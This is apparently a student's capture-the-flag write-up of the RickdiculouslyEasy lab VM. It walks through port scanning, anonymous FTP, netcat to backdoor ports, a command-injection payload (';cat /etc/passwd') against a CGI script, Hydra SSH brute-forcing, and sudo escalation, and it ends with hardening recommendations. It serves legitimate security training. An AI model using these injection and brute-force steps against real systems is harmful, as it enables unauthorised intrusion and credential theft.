# RickdiculouslyEasy — Penetration Testing Report

**Author:** Rizky Pratama Suhud  
**VM:** RickdiculouslyEasy VM  
**Total Score:** 130 Points

---

## 1. Overview

This project involves a security assessment of the *RickdiculouslyEasy* virtual machine, designed as a Capture The Flag (CTF) exercise for ethical hacking practice.
The goal was to identify vulnerabilities, exploit them ethically, and collect hidden flags as evidence of successful penetration.

All activities were performed in an isolated lab environment with explicit authorization.

---

## 2. Methodology

### **2.1 Scope**
The assessment followed the standard penetration testing phases:

- Reconnaissance
- Scanning and Enumeration
- Exploitation
- Privilege Escalation
- Post-Exploitation and Reporting

### **2.2 Tools Used**

| Tool | Function | Example Command |
|------|-----------|----------------|
| **Nmap** | Network scanning and enumeration | `nmap -A -p- 192.168.56.105` |
| **Nikto** | Web vulnerability scanner | `nikto -h http://192.168.56.105` |
| **Hydra** | Brute-force password testing | `hydra -l user -P wordlist ssh://host -s 22222` |
| **Netcat** | TCP interaction and shell connection | `nc 192.168.56.105 13337` |
| **Binwalk** | Hidden data extraction | `binwalk Safe_Password.jpg` |
| **unzip** | Archive extraction | `unzip journal.txt.zip` |

---

## ⚙️ 3. Execution Steps

### **Step 1 — Footprinting**
Verified target connectivity using:
```bash
ping 192.168.56.105
traceroute 192.168.56.105
```
✅ Target responded within 0.178 ms, reachable within local lab.

---

### **Step 2 — Port Scanning**
Nmap detected multiple open ports:

| Port | Service | Description |
|------|----------|-------------|
| 21 | FTP | Anonymous access enabled, contains `FLAG.txt` |
| 22 / 22222 | SSH | OpenSSH 7.5 (Ubuntu 14.04) |
| 80 | HTTP | Apache 2.4.27 (Fedora) |
| 9090 | Cockpit Web Service | Administrative interface |
| 13337 | Custom | Displays flag directly |
| 60000 | Reverse shell | Root shell access |

---

### **Step 3 — FTP Anonymous Access**
Connected via:
```bash
ftp 192.168.56.105
```
✅ Anonymous login allowed; downloaded `FLAG.txt` successfully.

---

### **Step 4 — Exploitation and Flag Collection**
#### TCP Backdoor:
```bash
nc 192.168.56.105 13337
```
Flag found:  
```
FLAG{TheyFoundMyBackDoorMorty}
```

#### Reverse Shell:
```bash
nc 192.168.56.105 60000
```
Obtained root shell with flag:  
```
FLAG{Flip the pickle Morty!}
```

---

### **Step 5 — Web Enumeration**
Accessed `/robots.txt` revealing:
```
/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
```

- `/cgi-bin/root_shell.cgi` → inactive  
- `/cgi-bin/tracertool.cgi` → vulnerable to **Command Injection**

Example payload:
```bash
;cat /etc/passwd
```
✅ Output confirmed execution → **RCE vulnerability**

---

### **Step 6 — Web Flags**
- Port `9090`: `FLAG{THERE IS NO ZEUS, IN YOUR FACE!}`
- Directory `/passwords`:  
  - `FLAG.txt` → `FLAG{Yeah d- just don't do it.}`
  - `passwords.html` → Commented password: `<!--Password: winter-->`

---

### **Step 7 — SSH Enumeration**
- `ssh Summer@192.168.56.105 -p 22222` → Login successful  
- Found flag in `/home/Summer/FLAG.txt`  
  ```
  FLAG{Get off the high road Summer!}
  ```

---

### **Step 8 — File Analysis**
Transferred suspicious files:
- `journal.txt.zip`
- `Safe_Password.jpg`
- `safe`

#### Using binwalk:
```bash
binwalk Safe_Password.jpg
```
Found embedded password → `Meeseek`

Extracted `journal.txt.zip` with:
```bash
unzip -P Meeseek journal.txt.zip
```
Contained flag:
```
FLAG{131333}
```

---

### **Step 9 — Binary Analysis**
`safe` binary → ELF x86-64 executable.  
Running with discovered code:
```bash
./safe 131333
```
Output:
```
FLAG{And Awwaaaaayyyy we Go!}
```

---

### **Step 10 — Privilege Escalation**
Created wordlist from hint:
```bash
crunch ... > Rick_wordlist
hydra -l RickSanchez -P Rick_wordlist ssh://192.168.56.105 -s 22222
```
✅ Credentials found:  
```
RickSanchez:P7Curtains
```
Logged in → `sudo -i` → Root shell gained.  
Final flag:
```
FLAG{Ionic Defibrillator}
```

---

## 4. Results

### **4.1 Flags Summary**

| # | Flag | Points |
|---|------|--------|
| 1 | `FLAG{Whoa this is unexpected}` | 10 |
| 2 | `FLAG{TheyFoundMyBackDoorMorty}` | 10 |
| 3 | `FLAG{Flip the pickle Morty!}` | 10 |
| 4 | `FLAG{There is no Zeus, in your face!}` | 10 |
| 5 | `FLAG{Yeah d- just don't do it.}` | 10 |
| 6 | `FLAG{Get off the high road Summer!}` | 10 |
| 7 | `FLAG{131333}` | 20 |
| 8 | `FLAG{And Awwaaaaayyyy we Go!}` | 20 |
| 9 | `FLAG{Ionic Defibrillator}` | 30 |

**Total: 130 Points**

---

### **4.2 Tool Effectiveness**
| Tool | Evaluation |
|------|-------------|
| **Nmap** | Excellent for mapping and version detection |
| **Nikto** | Useful for detecting misconfigurations |
| **Hydra** | Effective for wordlist-based SSH attacks |
| **Netcat** | Essential for simple TCP testing |
| **Binwalk** | Critical in uncovering hidden passwords |

---

### **4.3 Key Challenges & Solutions**

| Issue | Cause | Solution |
|-------|--------|----------|
| Web CGI not executing payloads | Input filters | Payload adjustment |
| Encrypted zip extraction failed | Password protection | Metadata analysis with binwalk |
| Long ASCII output unreadable | Flag rendered as ASCII art | Use `more` for controlled display |
| Network desync between VMs | Adapter mismatch | Combined NAT + Host-only setup |

---

### **4.4 Security Recommendations**

| Vulnerability | Recommendation | Priority |
|----------------|----------------|----------|
| FTP Anonymous Access | Disable anonymous login | 🔴 High |
| Weak SSH Credentials | Enforce complex passwords | 🔴 High |
| Directory Listing | Disable `Indexes` in Apache | 🟠 Medium |
| Unsecured Cockpit Service | Restrict access & enable HTTPS | 🟠 Medium |
| Loose File Permissions | Restrict sensitive files | 🟠 Medium |
| Unverified Executables | Use AppArmor/SELinux | 🟠 Medium |
| Missing Audit Logs | Enable system auditing | 🟢 Low |
| Excessive Sudo Rights | Limit commands in `sudoers` | 🟠 Medium |

---

## 5. Environment Setup

**VM Configuration:**
- Target: Host-only adapter  
- Attacker: Kali Linux (NAT + Host-only)

Ensures isolation from external networks and controlled analysis.

---

##  6. Conclusion

The *RickdiculouslyEasy* VM successfully demonstrated a complete penetration testing workflow, from reconnaissance to privilege escalation.  
All nine flags were captured with total **130 points**, validating tool efficiency and methodology.  
The environment proved ideal for demonstrating real-world exploitation and reporting standards.

---

## 📎 Attachments
- [Original PDF Report](attachments/Rizky_Pratama_Suhud_Laporan_RickdiculouslyEasy.pdf)
---
